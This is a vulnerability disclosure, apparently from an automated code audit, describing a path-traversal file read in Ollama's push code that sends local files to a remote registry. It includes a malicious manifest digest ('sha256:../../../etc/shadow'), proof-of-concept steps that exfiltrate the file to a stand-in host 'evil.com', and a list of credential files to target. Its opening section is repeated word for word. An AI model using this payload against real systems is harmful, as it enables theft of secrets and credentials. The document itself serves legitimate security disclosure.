## Summary

`pushWithTransfer` is the symmetric counterpart to `pullWithTransfer`. On HEAD `57653b8e`, the same class of bug appears on the upload side: `server/images.go:800` copies each `layer.Digest` verbatim into `transfer.Blob{Digest}`, and `x/imagegen/transfer/upload.go:181` opens `filepath.Join(u.srcDir, digestToPath(blob.Digest))` — again using the transfer package's own raw `strings.Replace` instead of `manifest.BlobsPath`'s regex-validated helper.

The per-layer `layer.Digest` comes from the on-disk manifest JSON read by `manifest.ParseNamedManifest` at `manifest/manifest.go:112-146`, which only `json.NewDecoder.Decode`'s into a struct without charset validation. A prior `ollama pull` from an attacker-controlled registry can store a manifest containing `"digest":"sha256:../../../etc/shadow"`; a subsequent `ollama push` to any registry (attacker-controlled or otherwise) opens `/etc/shadow` and uploads its contents to that registry.

Chained with Finding 002 (SSRF), the attacker needs no credentials: they host the first registry, receive the exfiltrated file, and can simultaneously hit cloud metadata services for IMDS tokens.

## Details

`pushWithTransfer` is the symmetric counterpart to `pullWithTransfer`. On HEAD `57653b8e`, the same class of bug appears on the upload side: `server/images.go:800` copies each `layer.Digest` verbatim into `transfer.Blob{Digest}`, and `x/imagegen/transfer/upload.go:181` opens `filepath.Join(u.srcDir, digestToPath(blob.Digest))` — again using the transfer package's own raw `strings.Replace` instead of `manifest.BlobsPath`'s regex-validated helper.

The per-layer `layer.Digest` comes from the on-disk manifest JSON read by `manifest.ParseNamedManifest` at `manifest/manifest.go:112-146`, which only `json.NewDecoder.Decode`'s into a struct without charset validation. A prior `ollama pull` from an attacker-controlled registry can store a manifest containing `"digest":"sha256:../../../etc/shadow"`; a subsequent `ollama push` to any registry (attacker-controlled or otherwise) opens `/etc/shadow` and uploads its contents to that registry.

Chained with Finding 002 (SSRF), the attacker needs no credentials: they host the first registry, receive the exfiltrated file, and can simultaneously hit cloud metadata services for IMDS tokens.

### Location

- `server/images.go:796-851` — `pushWithTransfer`
- `server/images.go:798-803` — raw digest copy
- `manifest/manifest.go:112-146` — `ParseNamedManifest` (no digest validation)
- `x/imagegen/transfer/upload.go:181` — `os.Open(filepath.Join(u.srcDir, digestToPath(blob.Digest)))`
- `x/imagegen/transfer/transfer.go:164-170` — `digestToPath` (shared with Finding 001)

### Attacker Control

Multi-step:
1. Attacker persuades / tricks victim to `ollama pull <attacker-registry>/<model>` — stores malicious manifest.
2. Victim `ollama push <any-registry>/<model>` — push target can be attacker-controlled (they mirror it) or any registry they can read logs from.

Alternative — local attacker: directly writes a manifest file at `<OLLAMA_MODELS>/manifests/.../<tag>` with traversal digests, then triggers push via API.

### Trust Boundary Crossed

Local filesystem → network (exfiltration). Via the pull chain, this extends to Network → Local filesystem → Network.

### Evidence

```go
// server/images.go:529-564 (PushModel entry)
func PushModel(...) error {
    ...
    mf, err := manifest.ParseNamedManifest(n)  // no digest validation
    ...
    var layers []manifest.Layer
    layers = append(layers, mf.Layers...)
    if mf.Config.Digest != "" {
        layers = append(layers, mf.Config)
    }
    if hasTensorLayers(layers) {
        manifestPath, err := manifest.PathForName(n)
        ...
        manifestJSON, err := os.ReadFile(manifestPath)
        ...
        if err := pushWithTransfer(ctx, n, layers, manifestJSON, regOpts, fn); err != nil {
            return err
        }
    }
    ...
}

// server/images.go:795-851 (pushWithTransfer)
func pushWithTransfer(...) error {
    blobs := make([]transfer.Blob, len(layers))
    for i, layer := range layers {
        blobs[i] = transfer.Blob{
            Digest: layer.Digest,    // <-- raw
            Size:   layer.Size,
            From:   layer.From,
        }
    }
    srcDir, err := manifest.BlobsPath("")   // only for dir; NOT per-layer validation
    ...
    return transfer.Upload(ctx, transfer.UploadOptions{
        Blobs: blobs, BaseURL: baseURL, SrcDir: srcDir, ...
    })
}

// x/imagegen/transfer/upload.go:181
f, err := os.Open(filepath.Join(u.srcDir, digestToPath(blob.Digest)))   // <-- sink
```

Contrast with the standard layer-open path:

```go
// manifest/layer.go:108-119
func (l *Layer) Open() (io.ReadSeekCloser, error) {
    ...
    blob, err := BlobsPath(l.Digest)   // <-- regex-validated
    ...
    return os.Open(blob)
}
```

The transfer package duplicates the path helper and drops the validation.

## Root Cause

Validated rationale: pushWithTransfer copies raw layer.Digest into transfer.Blob; upload.go:181 opens filepath.Join(srcDir, digestToPath(digest)) without BlobsPath; Advocate confirmed no IsLocal/regex on the push path and ParseNamedManifest performs no digest charset validation.

Primary cited code reference: `server/images.go:796`.

Merge extraction sink line: - `server/images.go:796-851` — `pushWithTransfer`

## Proof of Concept

Merge-normalized status: `pending`.

No concrete evidence artifacts were preserved under `evidence/` during the merge.

1. Attacker stands up `evil.com` serving:
   - Manifest with one tensor layer (to flip `hasTensorLayers`) and one config layer:
     ```json
     {"mediaType":"application/vnd.ollama.image.json",
      "digest":"sha256:../../../etc/shadow",
      "size":4096}
     ```
2. Victim:
   ```
   ollama pull evil.com/model:latest
   ```
   Manifest stored at `<OLLAMA_MODELS>/manifests/evil.com/library/model/latest` with traversal digest intact.
3. Attacker arranges `ollama push evil.com/model:latest` (social, automation, or chain with prior SSRF).
4. `upload.go:181` opens `/etc/shadow` (path resolves under `filepath.Clean`); body streams into `PUT /v2/.../blobs/upload` on `evil.com`.
5. Attacker retrieves `/etc/shadow` from their registry logs.

Debate context: Advocate confirmed no `IsLocal` / `BlobsPath` validation on the push path. Tracer confirmed `ParseNamedManifest` stores and retrieves digests verbatim. This is the symmetric read of Finding 001's write; both stem from the transfer package's decision to re-implement `digestToPath` without the regex that `manifest.BlobsPath` uses.

## Impact

- Arbitrary file read of any path readable by the ollama user, transmitted to a remote registry.
- Sensitive targets: `/etc/passwd`, `~ollama/.ssh/id_rsa`, `~/.config/*/credentials`, `/var/lib/ollama/**`, `/etc/shadow` if ollama is `root` or has CAP_DAC_READ_SEARCH (uncommon but possible via systemd overrides).
- Combined with Finding 002 (SSRF to IMDS): full cloud takeover without initial credentials.

_Synthesized during merge normalization from `archon/findings/H3-pushwithtransfer-traversal-read/draft.md`._
